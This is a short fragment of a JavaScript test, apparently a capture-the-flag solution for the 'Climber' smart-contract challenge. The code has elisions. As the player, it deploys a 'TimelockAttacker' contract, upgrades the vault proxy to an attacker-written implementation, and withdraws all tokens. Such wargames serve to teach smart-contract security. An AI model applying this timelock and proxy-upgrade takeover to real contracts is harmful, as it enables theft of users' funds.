...
describe("[Challenge] Climber", function () {
  ...
  it("Execution", async function () {
    ...
    const attacker = await (
      await ethers.getContractFactory("TimelockAttacker", player)
    ...
    const vaultV2 = await upgrades.upgradeProxy(
      vault.address,
      await ethers.getContractFactory("NewClimberVault", player)
    );
    await vaultV2.connect(player).withdrawAll(token.address);
  });
